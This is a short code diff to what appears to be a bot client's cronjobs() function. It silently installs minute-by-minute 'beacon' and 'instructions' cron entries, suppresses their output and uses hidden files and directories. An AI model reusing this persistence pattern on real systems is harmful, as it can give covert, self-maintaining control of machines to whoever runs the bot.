@@ -14,9 +14,20 @@ def cronjobs():
 	start = '(crontab -l 2>/dev/null; echo "0 12 * * * '+whoami+' >/dev/null 2>&1") | crontab -'
 	beacon = '(crontab -l 2>/dev/null; echo "* * * * * '+whoami+' beacon >/dev/null 2>&1")| crontab -'
 	instructions = '(crontab -l 2>/dev/null; echo "* * * * * '+whoami+' instructions >/dev/null 2>&1")| crontab -'
-	os.system(start)
-	os.system(beacon)
-	os.system(instructions)
+	croncheck = 'crontab -l > .cron.bot'
+	startcron = '0 12 * * * '+whoami+' >/dev/null 2>&1'
+	beaconcron = '* * * * * '+whoami+' beacon >/dev/null 2>&1'
+	instructionscron = '* * * * * '+whoami+' instructions >/dev/null 2>&1'
+	os.system(croncheck)
+	with open('.cron.bot', 'r') as f:
+		cronstring = f.read().strip('\n')
+		if startcron not in cronstring:
+			os.system(start)
+		if beaconcron not in cronstring:
+			os.system(beacon)
+		if instructionscron not in cronstring:
+			os.system(instructions)
+	os.system('rm .cron.bot')
 
 #this creates hidden directory '.bot' in the working directory of the program.  
 ## in .bot, it creates a file called name.txt
